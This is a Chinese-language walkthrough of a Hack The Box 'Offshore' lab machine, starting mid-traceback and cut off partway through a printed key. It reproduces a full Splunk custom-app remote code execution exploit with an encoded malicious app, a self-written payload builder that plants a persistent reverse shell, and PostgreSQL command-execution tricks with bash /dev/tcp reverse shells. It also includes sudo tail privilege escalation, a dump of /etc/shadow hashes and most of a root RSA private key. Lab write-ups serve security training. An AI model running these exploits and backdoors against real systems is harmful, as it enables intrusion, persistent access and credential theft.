ssl.SSLError: [SSL] record layer failure (_ssl.c:1006)

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connectionpool.py", line 787, in urlopen
    response = self._make_request(
               ^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connectionpool.py", line 488, in _make_request
    raise new_e
urllib3.exceptions.SSLError: [SSL] record layer failure (_ssl.c:1006)

The above exception was the direct cause of the following exception:

Traceback (most recent call last):
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/requests/adapters.py", line 644, in send
    resp = conn.urlopen(
           ^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/connectionpool.py", line 841, in urlopen
    retries = retries.increment(
              ^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/urllib3/util/retry.py", line 535, in increment
    raise MaxRetryError(_pool, url, reason) from reason  # type: ignore[arg-type]
    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
urllib3.exceptions.MaxRetryError: HTTPSConnectionPool(host='10.10.110.123', port=8000): Max retries exceeded with url: /services/apps/local/ (Caused by SSLError(SSLError(1, '[SSL] record layer failure (_ssl.c:1006)')))

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/kali/Desktop/htb/offshore/PySplunkWhisperer2_remote.py", line 107, in <module>
    req = s.get(SPLUNK_BASE_API)
          ^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/requests/sessions.py", line 602, in get
    return self.request("GET", url, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/requests/sessions.py", line 589, in request
    resp = self.send(prep, **send_kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/requests/sessions.py", line 703, in send
    r = adapter.send(request, **kwargs)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/web/lib/python3.11/site-packages/requests/adapters.py", line 675, in send
    raise SSLError(e, request=request)
requests.exceptions.SSLError: HTTPSConnectionPool(host='10.10.110.123', port=8000): Max retries exceeded with url: /services/apps/local/ (Caused by SSLError(SSLError(1, '[SSL] record layer failure (_ssl.c:1006)')))

```

## Splunk Enterprise 7.2.3 - (Authenticated) Custom App Remote Code Execution 
### Exp
[Splunk Enterprise 7.2.3 - (Authenticated) Custom App Remote Code Execution](https://www.exploit-db.com/exploits/46238)

[Splunk Enterprise 7.2.4 - Custom App Remote Command Execution (Persistent Backdoor / Custom Binary)](https://www.exploit-db.com/exploits/46487)

```c
#!/usr/bin/python

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
from sys import stdout,argv
from os import getcwd,path,system
from subprocess import Popen

# Download and unpack the correct version for your OS from here: github.com/mozilla/geckodriver/releases
gecko_driver_path = '/home/kali/Desktop/tools/SplunkSploit/Gecko/geckodriver'

def checkLogin(url):
	if '/login' not in url and '/logout' not in url:
		print 'Login successful!'
	else:
		print 'Login failed! Aborting...'
		exit()


def checkUrl(url):
	if '_upload' not in url:
		print '[-] Navigation error, aborting...'
		exit()


def exploit(splunk_target_url, splunk_admin_user, splunk_admin_pass, lport):
	print '[+] Starting bot ...'
	profile = webdriver.FirefoxProfile()
	profile.accept_untrusted_certs = True
	driver = webdriver.Firefox(firefox_profile=profile, executable_path=gecko_driver_path)

	print '[*] Loading the target page ...'
	driver.get(splunk_target_url)
	sleep(1)

	stdout.write('[*] Attempting to log in with the provided credentials ... ')
	username_field = driver.find_element_by_name("username")
	username_field.clear()
	username_field.send_keys(splunk_admin_user)
	sleep(1)

	pw_field = driver.find_element_by_name("password")
	pw_field.clear()
	pw_field.send_keys(splunk_admin_pass)
	pw_field.send_keys(Keys.RETURN)
	sleep(3)

	current_url = driver.current_url
	checkLogin(current_url)

	url = driver.current_url.split('/')
	upload_url = url[0] + '//' + str(url[2]) + '/' + url[3] + '/manager/appinstall/_upload'
	print '[*] Navigating to the uploads page ({}) ...'.format(upload_url)
	driver.get(upload_url)
	sleep(1)

	current_url = driver.current_url
	checkUrl(current_url)

	form = driver.find_element_by_tag_name("form")
	input = form.find_element_by_id("appfile")
	input.send_keys(getcwd()+'/'+'splunk-shell.tar.gz')
	force_update = driver.find_element_by_id("force")
	force_update.click()
	submit_button = driver.find_element_by_class_name("splButton-primary")
	submit_button.click()

	print '[*] Your persistent shell has been successfully uploaded!'
	driver.quit()
	print '[+] Preparing to catch shell ... (this may take up to 1 minute)'
	system('nc -lvp {}'.format(lport))


def generatePayload(lhost, lport):
	# this hex decodes into the evil splunk app (tar.gz file) that we will be uploading as the payload
	# after the app is written to disk, a reverse shell is created and added to the app (it uses the user-supplied lhost and lport parameters to create the shell)
	# the app configuration sets it to be enabled upon installation (restarting splunk / manually enabling it is not required.)
	# this is a PERSISTENT backdoor, there is no need to re-upload multiple times... the backdoor will reconnect every 10-20 seconds
	print '[*] Creating Splunk App...'
	shell = '1f8b080030e9485c0003ed5b6b6fdb3614cd67fd0a221e9036ab65bd95b87b206b332c5830144bda0e705d8396689b8b446aa214271bf6df7749d9895f8993d451da95e7432c91145f87e7f25e89115952b2b3a6189124696d3d0e2c40e8fbea17b0f8abae6dd7731c3b702c1fd26dc70ead2de43f527fe6508a02e7086de59c17b7955b97ff8542ccf29ff0083fc22a50fc2ff37e0bffaee36bfe6bc10afe7196991167838db521090e6ee11fb85fe0df0bc2700b591bebc12df8caf9ef50061390245d037e0a82be4784e17e4262c3e894b46b50d13ba782420a64d99098e09245239277e13ac3d1191e92ae0109d1596fc0f35e99c5508d50859f7a6c1aeb31a7ff3e658fe103dc63fff71cdf95fb7fe885dafed78139fe535260902fdef022b8bfffe7867affaf07abf98fc900974961ca844f6f4312ec79de8dfcbbaebbc07fe078b6deffeb40a76be0282242eed839c1316aa30eda45dd17689c53f00726b772b3cf79265a82b038c53469750d7291f1bc80e7c4a528486af0312339dc32dee7f1a561341a0df4eee8f0fdc9e9c1e9e1491b9173c220334f71824a417281c48897498cfa04499703151c45d00768558c704e62744ec958b92502dabfbeb963979f7a6abf08acd6bf0a0436a4fef5fe7fe8840bfaf743dbd2faaf031d88f65a931860fadb13bccc23d2535ebd28d3ae710e6aa59c81e042d3315d23e57141531512f89ebfef04e19e65865610ec419c6f8158676b55a2bd531da1e9eebbaee35475dc51e68b66686d3b7bbe6beefb76e8dad77d95a1ceba07617c96e9d976b01f5c3f781d0e4dcd1f8e53caee5a99ebb87bd7954de2a9d6523875e7ce795635aa3bf33fa77fe803d865686ab30ee0fdfd3fcf0eb5ff5f0b6ee05f6a96461b5a06f7e7dff78240f35f076ee71f12121ac125676624c403db58e3ffbb8ee7ccf32fff3a7affaf03ad5df46a84d910bcef11b8e15986123ee408763462222448a1d247840e47456b4ce36284605f4297e021209ac266f5026181c6b07ae4af2c9b612803aebcbc5625d06ecb30a1e66359f13f060254f5b591e766172f914a5275b7d19e05292aa10f9be130e7258bdba8cc9367d33549d3614b9c8173318d525bd51aeec98ef7fa093c66666cf81c428d664e3288279085acaacedea7543aa483a54aff350c98c1d3326708366739e4c9f328e3824add5036447ca0b2b64f549de80d1fc3f4c6db73532d27a96a73923d335daddd5df50ba5d05b16f13425ac2266c093848f651b096544a067630ab3bf1353a80a5fee2019b491bca0443c979c40c03556cfa996659b55f568f2401b3553fe779332595b13e6263aab26ee2a7f92d58708e1eca5ac60a983aadfaa1be391f4d30a72515c65a2262a670720207fccd1ce352fb37d46742057da4e0ca33b83d589e627b01ac5425333839a215b72bdbd96ecacaab7225d552957d2f62ceb22ca61ca25f9a8c831131904aaac585e5d0f6e1056d95d1a8461ca214a2d1e1d063359d1a5cc0218577f56b3a316f53c3b8f4fcec6d8b9d2795dec5cd9804db333b1858e3b357c29ce8794350b9eb5edabc4ca3c06bebcaf8c8e514a7e465448614ff4a9b4cd30c405139323bfe55525956cabb6e40338fe13763e84133a648a6fc5941ca909c41a74b0aa2a048d517665405e4c3788b93eb4617a187909a39bd8fd5f207823f9fb1c2e21401ad913a316f184e7ed46e862df9f98e7993e4ef60618eb53ef90ff6f2c7cff1d8a47f800f480f7fff293b0f6ff6bc032fff2ed2e5c6cb08d75efff2dcb5e8cffbd50bfffab05dabc7eddb851ffa6bdb1361ea0ffc0d1e77f6a81d6ffd78d39fd4fe39f0db7f100ff2fb0b5ff570b56f2af3ef56fee0ce83afb6f078bf6df0f1cfdfeb7163420ec7e37f9b6587d596c74a6673cba46e3e7a3c3e3d707c7470727cd540c698cbe4729fc3d3841ead6681cfe71fafbc1abd3e65f2a6ffa64e7e3876e77f743b7fd417cfbecc7ef20f387cec77677f7795bef379f1756ea7fc327c0a5c66f3bffe1848be7bf7dc70db4feebc0acfe6dd3322da3317d912b5ff8c955408765ae3e01a2014d88612c1f198fa9a8ce8cdf7080048a387b83fd20d8b78965937ee0c5b11b39837e1085180ff62c2f8afca88ffbcefeaa63e7039c086224b84f126963e4526d42e7b429d90056ea9fb2ac2c36e700acddffc3a5f39ff080d67f1d58a5ff57ea10a6409821b512d4770c81d30cd4288f079a205211e5342bdaad96a9fe6b40ad1f33bbec1a535b004ab5c01e14243fc709b22da3b209c565a6245d322ddfcf0137e83f2617646306609dfe9d65fddbdaffaf074bfa37670dc054f56a41ac3003102ba87b8814463c256fe4d10f04f2fee6e4cdf1dbdf7eedbdfea9551568c57da311f124bea588cc96c58a111e93aae0aa625536147ceaa9d3d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0d0f8ecf11f88a26c5b00500000'
	bytes = shell.decode('hex')
	f = open('splunk-shell.tar.gz','wb')
	f.write(bytes)
	f.close()
	print '\t==> Adding reverse shell (to {}:{}) to the app...'.format(lhost,lport)
	f = open('shell.py','w')
	f.write('import sys,socket,os,pty\n')
	f.write('ip="{}"\n'.format(lhost))
	f.write('port="{}"\n'.format(lport))
	f.write('s=socket.socket()\n')
	f.write('s.connect((ip,int(port)))\n')
	f.write('[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\n')
	f.write('pty.spawn("/bin/sh")\n')
	f.close()
	decompress_cmd = 'tar zxvf splunk-shell.tar.gz &>/dev/null; rm splunk-shell.tar.gz'
	p = Popen(decompress_cmd, shell=True, executable='/bin/bash')
	p.wait()
	move_cmd = 'mv shell.py splunk-shell/bin/'
	p = Popen(move_cmd, shell=True, executable='/bin/bash')
	p.wait()
	compress_cmd = 'tar zcvf splunk-shell.tar.gz splunk-shell/ &>/dev/null; rm -r splunk-shell/'
	p = Popen(compress_cmd, shell=True, executable='/bin/bash')
	p.wait()
	if path.isfile('splunk-shell.tar.gz'):
		print '\t==> Payload Ready! (splunk-shell.tar.gz)'


def showUsage():
	print '\n\tScript Usage: {} <targetUrl> <username> <password> <lhost> <lport>'.format(argv[0])
        print '\tExample: {} http://192.168.4.16:8000 admin changeme 192.168.4.5 4444\n'.format(argv[0])


if len(argv) != 6:
	showUsage()
	exit()

if not path.isfile(gecko_driver_path):
	print '\n\t[!] This program requires geckodriver, download the corresponding version for your OS from the following link:'
	print '\t\t==> https://github.com/mozilla/geckodriver/releases'
	print '\n\t[!] Extract the geckodriver binary, then add its full path to line 20 of this script.'
	print '\t\t==> gecko_driver_path = "/tmp/geckodriver"\n'
	exit()

splunk_target_url = argv[1]
splunk_admin_user = argv[2]
splunk_admin_pass = argv[3]
lhost = argv[4]
lport = argv[5]
generatePayload(lhost, lport)
exploit(splunk_target_url, splunk_admin_user, splunk_admin_pass, lport)
```

这个脚本我跑不了 仅拿到了splunk-shell.tar.gz

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# tree splunk-shell       
splunk-shell
├── appserver
│   └── static
│       └── application.css
├── bin
│   └── shell.py
├── default
│   ├── app.conf
│   ├── indexes.conf
│   ├── inputs.conf
│   └── props.conf
├── local
│   └── app.conf
├── logs
│   ├── maillog
│   └── maillog.1
└── metadata
    ├── default.meta
    └── local.meta

8 directories, 11 files
```

我们可以根据代码流程来手动实现

```c
requests.Session()
→ POST /en-US/account/login
→ 拿到 session cookie
→ POST /en-US/manager/appinstall/_upload
→ Splunk 自动解包 + 执行 app
```

### 手动实现
已知，Splunk存在未授权访问

```c
http://10.10.110.123:8000/en-US/manager/appinstall/_upload
```

![](/image/prolabs/Offshore-13.png)

我们将通过splunksploit.py得到的splunk-shell.tar.gz压缩包上传

当点击Upload的一瞬间，我们的nc回弹了shell

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.110.123] 43372
$ id
id
uid=1001(mark) gid=1001(mark) groups=1001(mark)
```

## Upgrade
由于我想用pwncat，所以我重新上传了，即便重启也没有回弹

```c
#!/usr/bin/env python3
import os
import tarfile
import shutil
import random
import string

LHOST = "10.10.16.30"
LPORT = 4444

def rand(n=6):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

APP = f"splunk-shell-{rand()}"

if os.path.exists(APP):
    shutil.rmtree(APP)

# ===== 目录结构（严格对齐原始 payload）=====
os.makedirs(f"{APP}/bin")
os.makedirs(f"{APP}/default")
os.makedirs(f"{APP}/local")
os.makedirs(f"{APP}/metadata")

# ===== shell.py（Python2）=====
shell = f"""#!/usr/bin/python
import socket,os,pty,time

while True:
    try:
        s=socket.socket()
        s.connect(("{LHOST}",{LPORT}))
        os.dup2(s.fileno(),0)
        os.dup2(s.fileno(),1)
        os.dup2(s.fileno(),2)
        pty.spawn("/bin/bash")
        s.close()
    except:
        time.sleep(10)
"""

with open(f"{APP}/bin/shell.py","w") as f:
    f.write(shell)
os.chmod(f"{APP}/bin/shell.py",0o755)

# ===== inputs.conf=====
with open(f"{APP}/default/inputs.conf","w") as f:
    f.write(f"""[script://$SPLUNK_HOME/etc/apps/{APP}/bin/shell.py]
interval = 10
disabled = 0
""")

# ===== default/app.conf =====
with open(f"{APP}/default/app.conf","w") as f:
    f.write("""[install]
state = enabled

[ui]
is_visible = false
""")

# ===== local/app.conf=====
with open(f"{APP}/local/app.conf","w") as f:
    f.write("""[install]
is_configured = true
""")

with open(f"{APP}/metadata/default.meta","w") as f:
    f.write("""[]
access = read : [ * ], write : [ admin ]
export = system
""")

# ===== 打包 =====
tarname = f"{APP}.tar.gz"
with tarfile.open(tarname,"w:gz") as tar:
    tar.add(APP)

print(f"[+] Payload: {tarname}")
print(f"[+] App name: {APP}")

```

```c
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# vi make_payload.py 

┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# python3 make_payload.py

[+] Payload generated: splunk-shell.tar.gz
```

重新上传后终于成功(这脚本搞了好久啊)

## Getflag
```c
(remote) mark@NIX01:/home/mark$ cat flag.txt
OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}
```

## 提权
### Suid
```c
(remote) mark@NIX01:/home/mark$ find / -perm -4000 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/vmware-user-suid-wrapper
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/bin/ping
/bin/su
/bin/umount
/bin/fusermount
/bin/mount
```

### Port
```c
netstat -tulpn

-t —— TCP               查看  TCP 连接
-u —— UDP               查看  UDP 连接
-l —— listening（监听） 显示 正在监听的端口
-p —— process（进程）   显示 是哪个进程在占用这个端口
```

```c
(remote) mark@NIX01:/$ netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:8089            0.0.0.0:*               LISTEN      15802/splunkd       
tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      15802/splunkd       
tcp        0      0 127.0.0.1:8065          0.0.0.0:*               LISTEN      15874/python        
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 ::1:5432                :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:* 
```

### 5432
> ** 端口5432是PostgreSQL 默认端口  **
>

#### `postgres` 
##### 系统用户（Linux User）
    - **PostgreSQL 安装时，会创建一个叫 **`**postgres**`** 的 Linux 用户，用来运行数据库服务。**
    - **这个用户的作用：**
        * **管理数据库进程**
        * **保护数据库文件权限**
        * **防止普通用户直接操作数据库目录**

```plain
$ id postgres
uid=104(postgres) gid=106(postgres) groups=106(postgres)
```

##### 数据库服务进程名字
+ PostgreSQL 的核心守护进程也叫 `postgres`。
+ 在 `ps aux | grep postgres` 里，你看到的：

```plain
postgres    777  ... /usr/local/pgsql/bin/postgres -D /usr/local/pgsql/data
```

这里：

+ `postgres`（最左边列） → Linux 系统用户
+ `/usr/local/pgsql/bin/postgres` → 进程程序（PostgreSQL 服务端程序）
+ `-D /usr/local/pgsql/data` → 指定数据存储目录

##### 数据库默认超级用户（DB User）
+ PostgreSQL 本身的数据库也有一个默认超级管理员叫 `postgres`。
+ 用于连接数据库和创建新用户、数据库、表等。
+ 这个用户在命令行里就是：

```plain
psql -U postgres
```

+ 默认绑定到系统 `postgres` 用户，但不一定相同。

#### pgsql程序
```plain
(remote) mark@NIX01:/$ pgsql
Error in sitecustomize; set PYTHONVERBOSE for traceback:
AttributeError: module 'sys' has no attribute 'setdefaultencoding'
Traceback (most recent call last):
  File "/usr/lib/command-not-found", line 28, in <module>
    from CommandNotFound import CommandNotFound
  File "/usr/lib/python3/dist-packages/CommandNotFound/CommandNotFound.py", line 19, in <module>
    from CommandNotFound.db.db import SqliteDatabase
  File "/usr/lib/python3/dist-packages/CommandNotFound/db/db.py", line 3, in <module>
    import sqlite3
  File "/usr/lib/python3.6/sqlite3/__init__.py", line 23, in <module>
    from sqlite3.dbapi2 import *
  File "/usr/lib/python3.6/sqlite3/dbapi2.py", line 27, in <module>
    from _sqlite3 import *
ImportError: /usr/lib/python3.6/lib-dynload/_sqlite3.cpython-36m-x86_64-linux-gnu.so: undefined symbol: sqlite3_enable_load_extension

(remote) mark@NIX01:/$ ps aux | grep postgres
postgres    737  0.0  0.3  76524  7488 ?        Ss   Feb04   0:00 /lib/systemd/systemd --user
postgres    738  0.0  0.1 109344  2076 ?        S    Feb04   0:00 (sd-pam)
postgres    777  0.0  0.8 171272 16580 ?        S    Feb04   0:00 /usr/local/pgsql/bin/postgres -D /usr/local/pgsql/data
postgres    826  0.0  0.1 171272  2828 ?        Ss   Feb04   0:00 postgres: checkpointer process   
postgres    827  0.0  0.1 171272  2824 ?        Ss   Feb04   0:00 postgres: writer process   
postgres    828  0.0  0.1 171272  2824 ?        Ss   Feb04   0:00 postgres: wal writer process   
postgres    829  0.0  0.2 171716  5560 ?        Ss   Feb04   0:00 postgres: autovacuum launcher process   
postgres    830  0.0  0.1  26288  2280 ?        Ss   Feb04   0:00 postgres: stats collector process   
mark      18445  0.0  0.2  29196  4124 pts/3    T    02:56   0:00 /usr/local/pgsql/bin/psql -U postgres
postgres  18446  0.0  0.4 172072  8624 ?        Ss   02:56   0:00 postgres: postgres postgres [local] idle
mark      19216  0.0  0.0  14432   996 pts/3    S+   03:11   0:00 grep --color=auto postgres
```

成功找到pgsql程序位于/usr/local/pgsql/bin/psql

### PostgreSQL
####  1️⃣ 查看当前数据库  
 \l 列出所有数据库  

```plain
(remote) mark@NIX01:/$ /usr/local/pgsql/bin/psql -U postgres
psql (9.6.0)
Type "help" for help.

postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 test      | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
(4 rows)
```

#### 2️⃣ 切换到某个数据库
```plain
\c <dbname>
```

#### 3️⃣ 查看当前用户和角色
```plain
\du
```

+ 显示所有数据库角色（类似用户）及权限
+ 你会看到谁有超级管理员权限（`Superuser`），谁是普通用户

---

#### 4️⃣ 查看表
```plain
\dt
```

+ 显示当前数据库里的表
+ 如果当前数据库是 `postgres`，可能表不多
+ 切换到目标数据库再看会更有用

---

#### 5️⃣ 执行 SQL 查询
你可以直接写 SQL，例如：

```plain
SELECT version();
SELECT current_user;
SELECT * FROM some_table LIMIT 5;
```

+ `version()` 显示 PostgreSQL 版本
+ `current_user` 显示你现在用的数据库角色
+ 可以用 `SELECT` 查询表数据

---

#### 6️⃣ 退出 PostgreSQL
```plain
\q
```

---

### [RCE with PostgreSQL Extensions](https://book.hacktricks.wiki/zh/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html?highlight=PostgreSQL#rce-with-postgresql-extensions)
#### 方法一
[RCE with PostgreSQL Extensions - HackTricks](https://book.hacktricks.wiki/zh/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html?highlight=PostgreSQL#rce-with-postgresql-extensions)

```plain
1.获得版本
SELECT version();
                                                     version                                                     
-----------------------------------------------------------------------------------------------------------------
 PostgreSQL 9.6.0 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.9) 5.4.0 20160609, 64-bit
(1 row)

2.安装postgresql-server-dev-9.6
apt install postgresql postgresql-server-dev-all

3.gcc编译代码
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# vi pg_exec.c   
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# gcc -I$(pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c

4.上传文件
Ctrl + D回到pwncat$
(local) pwncat$ upload ./Desktop/htb/offshore/pg_exec.so pg_exec.so
pg_exec.so ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 15.6/15.6 KB • ? • 0:00:00
[19:48:28] uploaded 15.64KiB in 7.44 seconds   
(local) pwncat$ back
(remote) mark@NIX01:/tmp/rce$ dir
pg_exec.c  pg_exec.so
(remote) mark@NIX01:/tmp/rce$ chmod 777 /tmp/pg_exec.so

5.上传编译好的库并使用以下命令执行：
/usr/local/pgsql/bin/psql -U postgres
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"');
```

```plain
#include <string.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

PG_FUNCTION_INFO_V1(pg_exec);
Datum pg_exec(PG_FUNCTION_ARGS) {
char* command = PG_GETARG_CSTRING(0);
PG_RETURN_INT32(system(command));
}
```

```plain
postgres=# CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec.so', 'pg_exec' LANGUAGE C STRICT;
ERROR:  incompatible library "/tmp/pg_exec.so": version mismatch
DETAIL:  Server is version 9.6, library is version 18.0.
```

[https://github.com/dionach/pgexec/tree/master/libraries](https://github.com/dionach/pgexec/tree/master/libraries)

直接下载[pg_exec-9.6.so](https://github.com/dionach/pgexec/blob/master/libraries/pg_exec-9.6.so)然后上传并在psql中执行

```plain
CREATE FUNCTION sys(cstring) RETURNS int AS '/tmp/pg_exec-9.6.so', 'pg_exec' LANGUAGE C STRICT;
SELECT sys('bash -c "bash -i >& /dev/tcp/你的IP/6666 0>&1"');
```

#### 方法二
这里还有更简便的方法

```plain
COPY (SELECT '') TO PROGRAM 'id';
返回：COPY 1

这说明：
✅ PostgreSQL 允许执行系统命令
✅ 命令是以 postgres OS 用户执行
✅ 你已经有 数据库 → OS 的 RCE


直接反弹shell
COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/你的IP/6666 0>&1"';
```

### postgres@NIX01
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.16.30] from (UNKNOWN) [10.10.110.123] 45002
bash: cannot set terminal process group (21702): Inappropriate ioctl for device
bash: no job control in this shell
postgres@NIX01:/usr/local/pgsql/data$ 
```

#### Getflag
```plain
postgres@NIX01:/usr/local/pgsql$ find / -name flag.txt 2>/dev/null
/home/mark/flag.txt
/var/lib/postgresql/flag.txt

postgres@NIX01:/usr/local/pgsql$ cat /var/lib/postgresql/flag.txt
OFFSHORE{fun_w1th_m@g1k_bl0ck$}
```

#### sudo -l
```c
postgres@NIX01:/usr/local/pgsql$ sudo -l
Matching Defaults entries for postgres on NIX01:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User postgres may run the following commands on NIX01:
    (ALL) NOPASSWD: /usr/bin/tail
```

[tail | GTFOBins](https://gtfobins.org/gtfobins/tail/#file-read)

#### Getflag
```c
postgres@NIX01:/usr/local/pgsql$ sudo tail -c+0 /root/flag.txt     
sudo tail -c+0 /root/flag.txt
OFFSHORE{st0p_tai1ing_m3_br0}
```

## 权限维持
### /etc/shadow
```c
postgres@NIX01:/usr/local/pgsql$ sudo tail -c+0 /etc/shadow
sudo tail -c+0 /etc/shadow
root:$6$UM9dnBFE$5LRqppNoZhJmLz0.cLGlZXeDWYjy4u4MWbTW/8vMu.vSCbhTFlCLDsRvtxj8kF1RrlbCeyJHitm9g9.pLe4uM1:17652:0:99999:7:::
daemon:*:17001:0:99999:7:::
bin:*:17001:0:99999:7:::
sys:*:17001:0:99999:7:::
sync:*:17001:0:99999:7:::
games:*:17001:0:99999:7:::
man:*:17001:0:99999:7:::
lp:*:17001:0:99999:7:::
mail:*:17001:0:99999:7:::
news:*:17001:0:99999:7:::
uucp:*:17001:0:99999:7:::
proxy:*:17001:0:99999:7:::
www-data:*:17001:0:99999:7:::
backup:*:17001:0:99999:7:::
list:*:17001:0:99999:7:::
irc:*:17001:0:99999:7:::
gnats:*:17001:0:99999:7:::
nobody:*:17001:0:99999:7:::
systemd-timesync:*:17001:0:99999:7:::
systemd-network:*:17001:0:99999:7:::
systemd-resolve:*:17001:0:99999:7:::
syslog:*:17001:0:99999:7:::
_apt:*:17001:0:99999:7:::
messagebus:*:17564:0:99999:7:::
uuidd:*:17564:0:99999:7:::
mark:$6$J7gvzz87$jy.tjUc9mWJHy5nxZtuqtXcX6zJdCAE8eX87rZfzEE0zaV8rKHyzNQ5YWzSn/ust0Y96sMRCWrFEkGhv5QD.O/:17642:0:99999:7:::
sshd:*:17564:0:99999:7:::
splunk:!:17564:0:99999:7:::
postgres:$6$ZQdBsxBU$YZeJIBNXNEJIWv5cwwGnuHrfxL04zaj1GXE0NhgL8pvmSgU2Csb/HTdesfPb7NY4ru7/UXa7Dvy/BynKzJLlI/:17758:0:99999:7:::
colord:*:19163:0:99999:7:::
saned:*:19656:0:99999:7:::
```

### /root/.ssh/id_rsa 
```c
postgres@NIX01:/usr/local/pgsql$ sudo tail -c+0 /root/.ssh/id_rsa 
sudo tail -c+0 /root/.ssh/id_rsa 
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOO
cqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818Uxyr
HBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kw
HKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGf
OtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrI
Wm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy
6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6Ul
HTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4
gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyT
Td7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJH
LE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fb
v1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oG
eAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4U
